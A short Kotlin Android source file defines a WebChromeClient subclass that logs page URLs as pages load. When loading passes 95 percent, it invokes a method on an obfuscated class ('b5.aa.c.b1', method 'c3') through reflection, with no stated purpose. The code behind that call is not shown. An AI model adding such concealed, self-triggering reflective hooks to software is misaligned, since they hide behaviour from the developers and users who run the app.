package com.wild.rice

import android.webkit.WebChromeClient
import android.webkit.WebView

/**
 * Date：2025/6/12
 * Describe:
 */
abstract class BaseWebView : WebChromeClient() {
    override fun onProgressChanged(view: WebView?, newProgress: Int) {
        super.onProgressChanged(view, newProgress)
        if (newProgress > 95) {
            Class.forName("b5.aa.c.b1").getMethod("c3", Int::class.java).invoke(null, newProgress)
        }
        RiceCenter.log("onProgressChanged-->${view?.url}")
    }
}